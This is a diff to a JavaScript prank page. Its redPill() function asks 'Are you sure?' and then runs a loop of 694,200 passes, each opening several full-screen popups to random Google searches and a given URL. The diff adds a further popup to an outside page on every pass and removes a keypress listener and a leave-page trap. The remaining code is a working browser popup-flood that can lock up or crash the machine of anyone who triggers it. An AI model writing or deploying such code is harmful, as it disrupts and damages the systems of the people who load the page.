@@ -135,23 +135,13 @@
       var randomNumber = getRandomInt(0,9);
       function redPill() {
         if (confirm("Are you sure?")) {
-          window.addEventListener('keydown', (e) => {
-            console.log(e)
-          })
-          window.dispatchEvent(new KeyboardEvent('keydown', {
-            'key': 'a'
-          }));
-          window.addEventListener('beforeunload', function (e) {
-            e.preventDefault();
-            e.returnValue = '';
-          });
           var fakeWindow = window.open("",);
           for (let i=0; i<694200; i++) {
             var spamWindow = window.open(randomLink, "", "width=1920, height=1080");
-			var inTabWindow = window.open("", "");
             var smallWindow = window.open(url, "", "width=1920,height=1080");
             var randomNumber = getRandomInt(0,9);
             var randomLink = 'https://www.google.com/search?q=' + randomNumber
+	    var openMass = window.open("https://182exe.github.io/matrix/666.html", "", "1920px", "1080px");
             for (let i=0; i<5; i++) {
               var randomLink = randomLink + randomNumber
               var randomNumber = getRandomInt(100,999);
